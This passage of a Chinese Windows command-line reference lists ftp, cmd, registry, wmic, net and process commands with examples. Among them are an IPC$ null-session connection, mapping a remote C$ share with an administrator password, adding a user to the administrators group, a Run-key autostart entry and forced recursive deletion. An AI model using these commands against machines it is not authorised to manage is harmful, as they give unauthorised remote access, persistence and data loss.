40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。
41.open host[port]：建立指定ftp服务器连接，可指定连接端口。
42.passive：进入被动传输方式。
43.prompt：设置多个文件传输时的交互提示。
44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。
45.put local-file[remote-file]：将本地文件local-file传送至远程主机。
46.pwd：显示远程主机的当前工作目录。
47.quit：同bye，退出ftp会话。
48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.
49.recv remote-file[local-file]：同get。
50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。
51.rhelp[cmd-name]：请求获得远程主机的帮助。
52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。
53.rename[from][to]：更改远程主机文件名。
54.reset：清除回答队列。
55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。
56.rmdir dir-name：删除远程主机目录。
57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。
58.send local-file[remote-file]：同put。
59.sendport：设置PORT命令的使用。
60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。
61.size file-name：显示远程主机文件大小，如：site idle 7200。
62.status：显示当前ftp状态。
63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。
64.sunique：将远程主机文件名存储设置为只一（与runique对应）。
65.system：显示远程主机的操作系统类型。
66.tenex：将文件传输类型设置为TENEX机的所需的类型。
67.tick：设置传输时的字节计数器。
68.trace：设置包跟踪。
69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如：type binary，设置二进制传输方式。
70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3
71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。
72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.
73.?[cmd]：同help.


"""




打开"运行"对话框（Win+R），输入cmd，打开控制台命令窗口...
"""
也可以通过cmd /c 命令 和 cmd /k 命令的方式来直接运行命令

注：/c表示执行完命令后关闭cmd窗口；/k表示执行完命令后保留cmd窗口

# 控制台命令窗口中一些技巧

复制内容：右键弹出快捷菜单，选择“标记(K)”，然后选中所需复制的内容，然后右键即可

粘贴内容：右键弹出快捷菜单，选择“粘贴(P)”

在文件夹空白处按住Shift，然后右键弹出快捷菜单，可以看到“在此处打开命令行窗口”

使用上下方向键，翻看使用过的命令

tab补齐功能

命令参数的路径：要使用反斜杠'\'，不要使用正斜杠'/'   如：del d:\test2\file\my.txt

命令参数的路径：若存在空格，应使用双引号将路径引起来  如：del "d:\program files\file\my.txt"

文件及目录名中不能包含下列任何字符：\ / : * ? " < > |

rem  // 在批处理文件中添加注解，其后的命令不会被执行，但会回显

::  // ::也可以起到rem的注释作用，且不会有回显

任何以冒号:开头的字符行, 在批处理中都被视作标号（label）, 而直接忽略其后的所有内容
有效标号：冒号后紧跟一个以字母数字开头的字符串，goto语句可以识别
无效标号：冒号后紧跟一个非字母数字的一个特殊符号，goto无法识别的标号，可以起到注释作用，::常被用作注释符号

0. 获取帮助

command /?  // 查看command命令帮助说明

1. 中断命令执行

Ctrl + Z

2. 文件/目录

cd   切换目录

例：cd   // 显示当前目录

例：cd ..   // 进入父目录

例：cd /d d:   // 进入上次d盘所在的目录（或在直接输入：d:）

例：cd /d d:\   // 进入d盘根目录

例：cd d: // 显示上次d盘所在的目录

例：cd /d d:\src // 进入d:\src目录

例：cd prj\src\view  // 进入当前目录下的prj\src\view文件夹

pushd  popd  使用栈来维护当前目录

md d:\mp3 // 在C:\建立mp3文件夹
md d:\mp4 // 在D:\建立mp4文件夹
cd /d d:\mp4 // 更改当前目录为d:\mp4
pushd c:\mp3 // 将当前目录d:\mp4入栈，并切换当前目录为c:\mp3
popd  // 将刚才保存的d:\mp4弹栈，并设置为当前目录

dir  显示目录中的内容

例：dir   // 显示当前目录中的子文件夹与文件

例：dir /b  // 只显示当前目录中的子文件夹与文件的文件名

例：dir /p  // 分页显示当前目录中的子文件夹与文件

例：dir /ad  // 显示当前目录中的子文件夹

例：dir /a-d  // 显示当前目录中的文件

例：dir c:\test   // 显示c:\test目录中的内容

例：dir keys.txt  // 显示当前目录中keys.txt的信息

例：dir /S   // 递归显示当前目录中的内容

例：dir key*  // 显示当前目录下以key开头的文件和文件夹的信息

例：dir /AH /OS  // 只显示当前目录中隐藏的文件和目录，并按照文件大小从小到大排序

tree 显示目录结构

例：tree d:\myfiles  // 显示d:\myfiles目录结构

ren  文件或目录重命名

例：ren rec.txt rec.ini  // 将当前目录下的rec.txt文件重命名为rec.ini

例：ren c:\test test_01  // 将c盘下的test文件夹重命名为test_01

例：ren Logs.txt Logs-%date:~0,4%%date:~5,2%%date:~8,2%_%time:~0,2%%time:~3,2%.txt  // 将当前目录下的Logs.txt文件重命名为Logs-20150114_2135.txt或Logs-20150114_ 812.txt（注意：小时只有个位数时会多一个空格，可以使用字符串替换：将空格替换成0）

md  创建目录

例：md movie music  // 在当前目录中创建名为movie和music的文件夹

例：md d:\test\movie  // 创建d:\test\movie目录

rd  删除目录

例：rd movie // 删除当前目录下的movie空文件夹

例：rd /s /q d:\test  // 使用安静模式删除d:\test（除目录本身外，还将删除指定目录下的所有子目录和文件）

copy 拷贝文件

例：copy key.txt c:\doc  // 将当前目录下的key.txt拷贝到c:\doc下（若doc中也存在一个key.txt文件，会询问是否覆盖）

例：copy jobs c:\doc  // 将当前目录下jobs文件夹中文件（不递归子目录）拷贝到c:\doc下（若doc中也存在相应的文件，会询问是否覆盖）

例：copy key.txt c:\doc\key_bak.txt  // 将当前目录下的key.txt拷贝到c:\doc下，并重命名为key_bak.txt（若doc中也存在一个key_bak.txt文件，会询问是否覆盖）

例：copy /Y key.txt c:\doc  // 将当前目录下的key.txt拷贝到c:\doc下（不询问，直接覆盖写）

例：copy key.txt +  // 复制文件到自己，实际上是修改了文件日期

例：copy /Y key1.txt + key2.txt key.txt  // 将当前目录下的key1.txt与key2.txt的内容合并写入key.txt中（不询问，直接覆盖写）

例：copy /B art_2.7z.* art_2.7z    // 将当前目录下的art_2.7z.开头的所有文件（按照名称升序排序）依次合并生成art_2.7z

例：copy /B art_2.7z.001+art_2.7z.002 art_2.7z    // 将当前目录下的art_2.7z.001、art_2.7z.002文件合并生成art_2.7z

xcopy  更强大的复制命令

例：xcopy c:\bat\hai d:\hello\ /y /h /e /f /c    // 将c:\bat\hai中的所有内容拷贝到d:\hello中  注意：需要在hello后加上\  表示hello为一个目录，否则xcopy会询问hello是F，还是D

例：xcopy c:\bat\hai d:\hello\ /d:12-29-2010  // 将c:\bat\hai中的2010年12月29日后更改的文件拷贝到d:\hello中

move 移动文件

例：move *.png test  // 将当前目录下的png图片移动到当前目录下test文件夹中 （若test中也存在同名的png图片，会询问是否覆盖）

例：move /Y *.png test  // 将当前目录下的png图片移动到当前目录下test文件夹中 （不询问，直接覆盖写）

例：move 1.png d:\test\2.png  // 将当前目录下的1.png移动到d盘test文件夹中，并重命名为2.png （若test中也存在同名的png图片，会询问是否覆盖）

例：move test d:\new  // 若d盘中存在new文件夹，将当前目录下的test文件夹移动到d盘new文件夹中；若不存在，将当前目录下的test文件夹移动到d盘，并重命名为new

del 删除文件   注意：目录及子目录都不会删除

例：del test  // 删除当前目录下的test文件夹中的所有非只读文件（子目录下的文件不删除；删除前会进行确认；等价于del test\*）

例：del /f test  // 删除当前目录下的test文件夹中的所有文件（含只读文件；子目录下的文件不删除；删除前会进行确认；等价于del /f test\*）

例：del /f /s /q test d:\test2\*.doc  // 删除当前目录下的test文件夹中所有文件及d:\test2中所有doc文件（含只读文件；递归子目录下的文件；删除前不确认）

++++++++++++++++++++++

/ar、/ah、/as、/aa 分别表示删除只读、隐藏、系统、存档文件
/a-r、/a-h、/a-s、/a-a 分别表示删除除只读、隐藏、系统、存档以外的文件

++++++++++++++++++++++

例：del /ar *.* // 删除当前目录下所有只读文件

例：del /a-s *.* // 删除当前目录下除系统文件以外的所有文件

replace 替换文件【即使这个文件在使用，仍然可以替换成功】

例：replace d:\love.mp3 d:\mp3   // 使用d盘下的love.mp3强制替换d盘mp3目录中的love.mp3文件

mklink  创建符号链接（win7引入）；创建的符号链接文件上会有一个类似快捷方式的箭头

win7下的mklink命令通过指定参数可以建立出不同形式的文件或目录链接，分为硬链接(hard link)、符号链接(symbolic link)和目录联接(junction)三种。

(1) 符号链接(symbolic link)

　建立一个软链接相当于建立一个文件（或目录），这个文件（或目录）用于指向别的文件（或目录），和win的快捷方式有些类似。

  删除这个链接，对原来的文件（或目录）没有影像没有任何影响；而当你删除原文件（或目录）时，再打开链接则会提示“位置不可用”。

(2) 目录联接(junction)

　作用基本和符号链接类似。区别在于，目录联接在建立时会自动引用原目录的绝对路径，而符号链接允许相对路径的引用。

(3) 硬链接(hard link)

　建立一个硬链接相当于给文件建立了一个别名，例如对1.txt创建了名字为2.txt的硬链接；

  若使用记事本对1.txt进行修改，则2.txt也同时被修改，若删除1.txt，则2.txt依然存在，且内容与1.txt一样。

建立链接请注意：
a、建立文件或目录链接限于 NTFS 文件系统；符号链接（目录联接）的建立可以跨分区（如：在d盘可以建立c盘文件或目录的链接），硬链接只能建立同一分区内的文件指向
b、硬链接只能用于文件，不能用于目录；目录联接只能用于目录；符号链接则均可以；
c、硬链接不允许对空文件建立链接，符号（软）链接可以。

+++++++++++++++++++++++++++++++++

mklink [[/d] | [/h] | [/j]] Link Target

/d　　 创建目录符号链接。黙认为文件符号链接。
/h　　 创建硬链接，而不是符号链接。
/j　　　创建目录联接。
Link　　指定新的符号链接名称。
Target　指定新链接引用的路径(相对或绝对)。

+++++++++++++++++++++++++++++++++

例：mklink /j "C:\Users" "D:\Users"   // 创建D盘Users目录联接到C盘，并命名为Users

attrib  查看或修改文件或目录的属性  【A：存档  R：只读  S：系统  H：隐藏】

例：attrib 1.txt   // 查看当前目录下1.txt的属性

例：attrib -R 1.txt  // 去掉1.txt的只读属性

例：attrib +H movie  // 隐藏movie文件夹

assoc 设置'文件扩展名'关联到的'文件类型'

例：assoc // 显示所有'文件扩展名'关联

例：assoc .txt // 显示.txt代表的'文件类型'，结果显示.txt=txtfile

例：assoc .doc // 显示.doc代表的'文件类型'，结果显示.doc=Word.Document.8

例：assoc .exe // 显示.exe代表的'文件类型'，结果显示.exe=exefile

例：assoc .txt=txtfile  // 恢复.txt的正确关联

ftype 设置'文件类型'关联到的'执行程序和参数'

例：ftype // 显示所有'文件类型'关联

例：ftype exefile // 显示exefile类型关联的命令行，结果显示 exefile="%1" %*

例：ftype txtfile=C:\Windows\notepad.exe %1 // 设置txtfile类型关联的命令行为：C:\Windows\notepad.exe %1

当双击一个.txt文件时，windows并不是根据.txt直接判断用notepad.exe打开
而是先判断.txt属于txtfile'文件类型'；再调用txtfile关联的命令行：txtfile=%SystemRoot%\system32\NOTEPAD.EXE %1

3. 文件查看

type 显示文本文件内容

例：type c:\11.txt   // 显示c盘中11.txt的文本内容

例：type conf.ini  // 显示当前目录下conf.ini的文本内容

例：type c:\11.txt | more  // 分页显示c盘中11.txt的文本内容

more 逐屏的显示文本文件内容

例：more conf.ini  //  逐屏的显示当前目录下conf.ini的文本内容   【空格：下一屏 q：退出 】

4. 注册表命令

reg 注册表相关操作

参数说明：

KeyName [\Machine]FullKey
           Machine为远程机器的机器名 - 忽略默认到当前机器。
           远程机器上只有 HKLM 和 HKU。
           FullKey ROOTKEY+SubKey
           ROOTKEY [ HKLM | HKCU | HKCR | HKU | HKCC ]
           SubKey 所选ROOTKEY下注册表项的完整名
/v        所选项之下要添加的值名
/ve      为注册表项添加空白值名<无名称>
/t        RegKey 数据类型
           [ REG_SZ | REG_MULTI_SZ | REG_DWORD_BIG_ENDIAN |
           REG_DWORD | REG_BINARY | REG_DWORD_LITTLE_ENDIAN |
           REG_NONE | REG_EXPAND_SZ ]
           如果忽略，则采用 REG_SZ
/s        指定一个在 REG_MULTI_SZ 数据字符串中
           用作分隔符的字符；如果忽略，则将""用作分隔符
/d        要分配给添加的注册表ValueName的数据
/f        不提示，强行改写现有注册表项

例：reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MyApp /t REG_SZ /d "c:\tools\myapp.exe" /f  // 强制添加一条开机启动c:\tools\myapp.exe程序的注册表项

例：reg add "HKLM\SOFTWARE\ScmClient" /v AgreementConfirmed /t REG_SZ /d 1 /f  // 解决32位xp打开ioa后，弹出的框关不掉问题

例：reg add "HKCU\ControlPanel\Desktop" /v WaitToKIllAppTimeOut /t REG_SZ /d 10000 /f // 强制添加一条加速关闭应用程序的注册表项

例：reg add "hkcu\software\Unity Technologies\Unity Editor 4.x" /v JdkPath_h4127442381 /t REG_SZ /f // 将JdkPath_h4127442381设置为空

例：reg add "HKCR\*\shell\WinDbg\command" /t REG_SZ /d "\"D:\Program Files (x86)\windbg\windbg.exe\" -z \"%1\" " /f    // 强制添加windbg打开dump文件到右键菜单的注册表项（不指明/v，键值将写入默认值名中）

例：reg add "HKCR\*\shell\WinHex\command" /t REG_SZ /d "\"D:\software-setup\system\winhex\winhex.exe\"  \"%1\" " /f    // 强制添加winhex到右键菜单的注册表项（不指明/v，键值将写入默认值名中）

注册表中%1 %2 %3 %4的含义：
--  %1表示文件列表，%2表示默认打印机，%3表示驱动器，%4表示端口

例：reg add "hkcu\software\microsoft\windows\currentversion\internet settings" /v AutoConfigURL /t REG_SZ /d "http://txp-01.tencent.com/proxy.pac" /f  // 为IE设置代理：http://txp-01.tencent.com/proxy.pac

例：reg add "hkcu\software\Sysinternals\Process Monitor" /v EulaAccepted /t REG_DWORD /d 1 /f  // 为Procmon.exe工具（Process Monitor为其属性面板上的描述名）添加License同意

例：reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MyApp /f  // 强制删除值名的MyApp的注册表项

例：reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /f  // 强制删除让任务栏里的任务管理器为灰色的注册表项

例：reg delete HKEY_CURRENT_USER\Environment /v HTTP_proxy /f  // 删除http代理

例：reg delete HKEY_CURRENT_USER\Environment /v HTTPS_proxy /f  // 删除https代理

例：reg copy "hkcu\software\microsoft\winmine" "hkcu\software\microsoft\winminebk" /s /f  // 强制复制winmine下所有的子项与值到winminebk中

例：reg export "hkcu\software\microsoft\winmine" c:\regbak\winmine.reg  // 导出winmine下所有的子项与值到c:\regbak\winmine.reg文件中

例：reg import c:\regbak\winmine.reg  // 导入c:\regbak\winmine.reg文件到注册表中

例：reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" /s   // 查询ie的安装路径

例：reg query HKCR\.dsw /ve  // 查询.dsw默认值

例：reg query HKEY_CURRENT_USER\Software\Tencent\QQGame\SYS /v GameDirectory  // 查询QQGame安装路径

5. @#@

&  顺序执行多条命令，而不管命令是否执行成功

例：cd /d d:\src&work.exe /o c:\result.txt  // 先将当前工作目录切换到d:\src下，然后执行work.exe /o c:\result.txt命令

&&  顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令

例：find "ok" c:\test.txt && echo 成功 // 如果找到了"ok"字样，就显示"成功"，找不到就不显示

||   顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令

例：find "ok" c:\test.txt || echo 不成功   // 如果找不到"ok"字样，就显示"不成功"，找到了就不显示

|    管道命令

例：dir *.* /s/a | find /c ".exe"   // 先执行dir命令，然后对输出结果（stdout）执行find命令（输出当前文件夹及所有子文件夹里的.exe文件的个数）

例：dir *.* /s/a 2>&1 | find /c ".exe"   // 先执行dir命令，然后对输出结果（stdout）和错误信息（stderr）执行find命令（输出当前文件夹及所有子文件夹里的.exe文件的个数）

>  将当前命令输出以覆盖的方式重定向

例：tasklist > p1.txt   // 将tasklist的输出结果（stdout）以覆盖的方式重定向到p1.txt文件中（注：tasklist的输出结果就不会打印到屏幕上了）

例：tasklist 1> p1.txt  // 等同于：tasklist > p1.txt

例：dir bin 2> p1.txt  // 输出结果（stdout）打印在屏幕上，错误信息（stderr）以覆盖的方式重定向到p1.txt中（注：bin目录不存在时，会输出错误信息）

例：dir bin > p1.txt 2>&1  // 将错误信息（stderr）重定向到输出结果（stdout），然后将输出结果（stdout）以覆盖的方式重定向到p1.txt中（注：bin目录不存在时，会输出错误信息）

例：dir bin 2> p1.txt 1>&2  // 将输出结果（stdout）重定向到错误信息（stderr），然后将错误信息（stderr）以覆盖的方式重定向到p1.txt中（注：bin目录不存在时，会输出错误信息） 注：与上条命令结果一致

例：tasklist >nul   // 屏幕上不打印tasklist的输出结果（stdout），错误信息（stderr）仍会打印

例：dir bin 2>nul   // 屏幕上不打印命令的错误信息（stderr），输出结果（stdout）仍会打印（注：bin目录不存在时，会输出错误信息）

例：dir bin >nul 2>&1   //  将命令的错误信息（stderr）重定向到输出结果（stdout），然后不打印输出结果（stdout）【屏幕上错误信息（stderr）和输出结果（stdout）都不打印】（注：bin目录不存在时，会输出错误信息）

例：dir bin 2>nul 1>&2   //  将命令的输出结果（stdout）重定向到错误信息（stderr），然后不打印错误信息（stderr）【屏幕上错误信息（stderr）和输出结果（stdout）都不打印】（注：bin目录不存在时，会输出错误信息）

>>  将当前命令输出以追加的方式重定向

例：tasklist >> p2.txt   // 将tasklist的输出结果（stdout）以追加的方式重定向到p2.txt文件中（注：tasklist的输出结果就不会打印到屏幕上了）

例：tasklist 1>> p2.txt  // 等同于：tasklist >> p2.txt

例：dir bin 2>> p2.txt  // 输出结果（stdout）打印在屏幕上，错误信息（stderr）以追加的方式重定向到p2.txt中（注：bin目录不存在时，会输出错误信息）

例：dir bin >> p2.txt 2>&1  // 将错误信息（stderr）重定向到输出结果（stdout），然后将输出结果（stdout）以追加的方式重定向到p2.txt中（注：bin目录不存在时，会输出错误信息）

例：dir bin 2>> p2.txt 1>&2  // 将输出结果（stdout）重定向到错误信息（stderr），然后将错误信息（stderr）以追加的方式重定向到p2.txt中（注：bin目录不存在时，会输出错误信息） 注：与上条命令结果一致

<    从文件中获得输入信息，而不是从屏幕上，一般用于date time label等需要等待输入的命令

例：date <temp.txt  // temp.txt中的内容为2005-05-01

编号	Handle	说明
0	stdin	键盘输入
1	stdout	在命令提示窗口上打印输出结果（默认）
2	stderr	在命令提示窗口上打印错误信息（默认）
3-9	undefined	应用程序自己定义和指定


@   命令修饰符  在执行命令前，不打印出该命令的内容

例：@cd /d d:\me   // 执行该命令时，不打印出命令的内容：cd /d d:/me

,    在某些特殊的情况下可以用来代替空格使用

例：dir,c:\   // 相当于：dir c:\

;    当命令相同的时候,可以将不同的目标用;隔离开来但执行效果不变。如执行过程中发生错误则只返回错误报告但程序还是会继续执行

例：dir c:\;d:\;e:\   // 相当于顺序执行：dir c:\    dir d:\     dir e:\

echo.   // 输出一个"回车换行"，空白行

echo off   // 后续所有命令在执行前，不打印出命令的内容

echo on   // 后续所有命令在执行前，打印出命令的内容

echo 123   // 输出123到终端屏幕

echo "Hello World!!!"   // 输出Hello World!!!到终端屏幕

echo %errorlevel%   // 每个命令运行结束，可以用这个命令行格式查看返回码；默认值为0，一般命令执行出错会设errorlevel为1

echo test > p1.txt  // 输出test的字符串到当前目录中的p1.txt文件中（以覆盖的方式）

set  // 显示当前用户所有的环境变量

set path // 查看path的环境变量值（准确的说是查看以path开头的环境变量）

set path=    // 清空path变量

set path=d:\execute  // 将path变量设置为d:\execute（注：修改的path只会影响当前回话，也不会存储到系统配置中去；当前cmd窗口关闭，新设置的path也就不存在了）

set path=%path%;d:\execute   // 在path变量中添加d:\execute（注：修改的path只会影响当前回话，也不会存储到系统配置中去；当前cmd窗口关闭，新设置的path也就不存在了）

path // 显示当前path变量的值

path ; // 清除所有搜索路径设置并指示cmd.exe只在当前目录中搜索

path d:\xxx;%PATH%  // 将d:\xxx路径添加到path中

---------------------------------------------------

set p=aa1bb1aa2bb2 // 设置变量p，并赋值为aa1bb1aa2bb2

echo %p% // 显示变量p代表的字符串，即aa1bb1aa2bb2

echo %p:~6% // 显示变量p中第6个字符以后的所有字符，即aa2bb2

echo %p:~6,3% // 显示第6个字符以后的3个字符，即aa2

echo %p:~0,3% // 显示前3个字符，即aa1

echo %p:~-2% // 显示最后面的2个字符，即b2

echo %p:~0,-2% // 显示除了最后2个字符以外的其它字符，即aa1bb1aa2b

echo %p:aa=c% // 用c替换变量p中所有的aa，即显示c1bb1c2bb2

echo %p:aa=% // 将变量p中的所有aa字符串置换为空，即显示1bb12bb2

echo %p:*bb=c% // 第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2

set p=%p:*bb=c% // 设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2

set /a p=39 // 设置p为数值型变量，值为39

set /a p=39/10 // 支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3

set /a p=p/10 // 用 /a 参数时，在 = 后面的变量可以不加%直接引用

set /a p="1&0" // &运算要加引号。其它支持的运算符参见set/?

---------------------------------------------------

cls  清除屏幕

ver  显示当前windows系统的版本号

winver  弹框显示当前windows系统信息

vol  显示当前分区的卷标

label  显示当前分区的卷标，同时提示输入新卷标

label c:system  设置c盘的卷标为system

time  显示或设置当前时间

例：time /t  // 显示当前时间

例：time   // 设置新的当前时间（格式：hh:mm:ss），直接回车则表示放弃设置

date  显示或设置当前日期

例：date /t  // 显示当前日期

例：date   // 设置新的当前日期（格式：YYYY/MM/DD），直接回车则表示放弃设置

title 正在做命令行测试  // 修改当前cmd窗口的标题栏文字为正在做命令行测试

prompt orz:   // 将命令提示符修改为orz:

print 1.txt  // 使用设置好的打印机来打印1.txt文本文件

call ff.bat   // 调用执行ff.bat脚本（ff.bat脚本执行完原脚本才会往下执行）

start  运行某程序或命令

例：start /max notepad.exe  // 最大化的方式启动记事本

例：start /min calc.exe   // 最小化的方式启动计算器

例：start  tasklist  // 启动一个cmd实例窗口，并运行tasklist

例：start explorer f:\  // 调用资源管理器打开f盘

例：strat iexplore "www.qq.com"  // 启动ie并打开www.qq.com网址

例：start ff.bat  // 启动开始执行ff.bat（启动ff.bat脚本后，原脚本继续执行，不会等ff.bat脚本执行完）

exit  退出当前cmd窗口实例

例：exit 0  // 退出当前cmd窗口实例，并将过程退出代码设置为0（0表示成功，非0表示失败）

例：exit /B 1  // 退出当前bat脚本，并将ERRORLEVEL系统变量设置为1

pause   暂停批处理程序，并显示出：请按任意键继续....

color  设置当前cmd窗口背景色和前景色（前景色即为字体的颜色）

例：color  // 恢复到缺省设置

例：color 02 // 将背景色设为黑色，将字体设为绿色

--------------------------------------
0 = 黑色 8 = 灰色
1 = 蓝色 9 = 淡蓝色
2 = 绿色 A = 淡绿色
3 = 浅绿色 B = 淡浅绿色
4 = 红色 C = 淡红色
5 = 紫色 D = 淡紫色
6 = 黄色 E = 淡黄色
7 = 白色 F = 亮白色
--------------------------------------

mode con cols=200 lines=60 & color 9f    设置DOS窗口颜色为9f，大小：200行 60列（若屏幕缓冲区大小的宽度w<200或高度h<60,最终DOS的窗口就会为w行，h列）



systeminfo  查看当前计算机的综合信息

systeminfo | findstr /i "初始安装日期 系统启动时间"   只查看当前计算机的初始安装日期和系统启动时间

wmic 查看硬件的信息   -- C:\Windows\System32\wbem\WMIC.exe

例：wmic logicaldisk   // 查看计算机上各个盘的相关信息

例：wmic LogicalDisk where "Caption='C:'" get FreeSpace,Size /value   // 获取C盘的剩余空间大小与总大小（单位：Byte）

例：wmic os get Caption,InstallDate,OSArchitecture /value  // 获取当前os的Caption、安装日期以及系统架构信息

wmic 查看进程信息

例：wmic process where Caption="buyticket.exe" get commandline,ExecutablePath,ProcessId,ThreadCount /value // 查看名为"buyticket.exe"所有进程命令行，exe全路径，PID及线程数

例：wmic process where Caption="buyticket.exe" get ExecutablePath,HandleCount /value   // 查看名为"buyticket.exe"所有进程的exe全路径及当前打开的句柄数

例：wmic process where Caption="buyticket.exe" get ExecutablePath,VirtualSize,WorkingSetSize /value   // 查看名为"buyticket.exe"所有进程的exe全路径、当前虚拟地址空间占用及物理内存工作集

logoff  注销当前用户

shutdown  关闭、重启、注销、休眠计算机

例：shutdown /s  // 关闭计算机

例：shutdown /s /t 3600  // 一小时后，关闭本地计算机

例：shutdown /a  // 终止系统关闭

例：shutdown /r  // 关闭并重启本地计算机

例：shutdown /m 192.168.1.166 /r  // 关闭并重启ip为192.168.1.166的计算机

+++++++++++++++++++++

远程关机权限的获取：
1）修改远程pc的“本地安全策略”，为指定的用户开放权限
在WindowsXP默认的安全策略中，只有Administrators组的用户才有权从远端关闭计算机，如果要给xxxx用户远程关机的权限。
可利用WindowsXP的“组策略”或“管理工具”中的“本地安全策略”来实现。
1.命令行运行gpedit.msc打开“组策略编辑器“；
2.导航到“计算机配置/Windows设置/安全设置/本地策略/用户权利指派”；
3.修改“从远端系统强制关机”，添加xxxx用户即可。

2）获得远程IPC管理权限
如果配置第一步后还出现“拒绝访问。”，则需要在运行shutdown命令前先运行如下命令
net use \\[ip地址或计算机名]\ipc$ password /user:xxxx
其中password为帐号xxxx的登录密码。

+++++++++++++++++++++

例：shutdown /g  // 关闭并重启计算机，重启后重新启动所有注册的应用程序

例：shutdown /l  // 注销本地计算机

例：shutdown /h /f // 休眠本地计算机（强制正在运行的应用程序关闭，不前台警告用户）

例：shutdown /s  // 关闭计算机

regsvr32  注册或反注册com组件

例：regsvr32 /s clock.ocx  // 以无声的方式注册clock.ocx组件

例：regsvr32 /u myCommon.dll  // 卸载myCommon.dll组件

format  格式化磁盘

例：format J: /FS:ntfs   // 以ntfs类型格式化J盘 【类型有:FAT、FAT32、exFAT、NTFS或UDF】

例：format J: /FS:fat32 /Q  //  以fat32类型快速格式化J盘

chkdsk /f D:   // 检查磁盘D并显示状态报告；加参数/f表示同时会修复磁盘上的错误

subst   磁盘映射  -- 磁盘映射信息都保存在注册表以下键值中：HKEY_CURRENT_USER\Network

例：subst  // 显示目前所有的映射

例：subst z: \\com\software  // 将\\com\software共享映射为本地z盘

例：subst y: e:\src  // 将e:\src映射为本地y盘

例：subst z: /d  // 删除z盘映射

cmdkey   凭据（保存的用户名和密码）

例：cmdkey /list  // 列出可用的凭据

例：cmdkey /list:10.12.190.82  // 列出指定目标的凭据

例：cmdkey /list:Domain:target=10.12.190.82  // 列出指定目标的凭据

例：cmdkey /add:Domain:target=10.12.190.82 /user:LiLei /pass:123456  // 添加凭据

例：cmdkey /delete:Domain:target=10.12.190.82  // 删除指定目标的凭据

cscript  执行vbs脚本

例：cscript /Nologo mac.vbs  // 执行mac.vbs脚本，显示本机mac地址

-------mac.vbs----------

Dim mc,mo
Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
For Each mo In mc
If mo.IPEnabled=True Then
MsgBox "本机网卡MAC地址是: " & mo.MacAddress
Exit For
End If
Next

--------------------------

6. net命令

net start  // 查看已经启动的服务

net start "Task Scheduler"   // 开启任务计划服务

net stop "Task Scheduler"   // 关闭任务计划服务

net start dnscache  // 开启dns缓存服务

net stop dnscache  // 关闭dns缓存服务

net share   // 查看当前用户下的共享目录

net share workFile /delete  // 取消名为workFile的共享状态

net share xxx=c:\360Downloads   // 将c:\360Downloads设为共享，并取名为xxx

net share ipc$ // 开启ipc$共享

net share ipc$ /del // 删除ipc$共享

net share c$ /del // 删除c盘共享

net use \\192.168.1.166\ipc$ " " /user:" " // 建立192.168.1.166的ipc空链接

net use \\192.168.1.166\ipc$ "123456" /user:"administrator"   // 直接登陆后建立192.168.1.166的ipc非空链接（用户名为administrator 密码为123456）

net use h: \\192.168.1.166\c$ "123456" /user:"administrator"   // 直接登陆后映射192.168.1.166的c盘到本地为h盘（用户名为administrator 密码为123456）

net use h: \\192.168.1.166\c$   // 登陆后映射192.168.1.166的c盘到本地为h盘

net use \\192.168.1.166\ipc$ /del  // 删除ipc链接

net use h: /del // 删除本地的h盘的映射

net view   // 查看本地局域网内开启了哪些共享

net view \\192.168.1.166  // 查看192.168.1.166的机器上在局域网内开启了哪些共享

net time \\127.0.0.1   // 查看本地机器的日期及时间

net time \\localhost   // 查看本地机器的日期及时间

net time \\192.168.1.166   // 查看192.168.1.166机器的日期及时间

net time \\192.168.1.166 /set  // 设置本地计算机时间与192.168.1.166主机的时间同步，加上参数/yes可取消确认信息

net user  // 查看当前机器上的用户

net user Administrator   // 查看当前机器上的Administrator用户的信息

net user Guest /active:yes  // 启用Guest用户

net user dev 123456 /add   // 新建一个名为dev，密码为123456的用户

net localgroup administrators dev /add  // 把名为dev的用户添加到管理员用户组中，使其具有管理员权限

net user dev /del  // 删除名为dev的用户

7. 进程操作

tasklist  // 显示当前运行的进程信息（可查看PID）

taskkill  结束指定的进程

例：taskkill /im notepad.exe  // 结束名为notepad.exe的进程

例：taskkill /pid 1230 /pid 1241 /pid 1253 /t // 结束pid为1230、1241和1253的进程以及由它们启动起来的子进程

例：taskkill /f /im cmd.exe /t   // 强制结束有名为cmd.exe的进程以及由它启动起来的子进程

8. 网络操作

ping  // 用于检测网络是否通畅，以及网络时延情况（工作在ICMP协议上）

例：ping baidu.com   //  测试与baidu服务器的连接情况

例：ping chen-pc0   // 测试机器名为chen-pc0的连接情况

例：ping 220.181.111.86   // 测试与ip为220.181.111.86的连接情况

例：ping -l 65500 -n 10 qq.com   // 向qq.com发送10次65500字节的ping

例：ping -n 6 127.0.0.1 // 对当前主机执行6次ping操作（花费时间为5s）

例：ping -t baidu.com   // 不断地测试baidu服务器的连接情况   【Ctrl+Pause Break：查看ping的统计信息；Ctrl+C：终止当前任务】

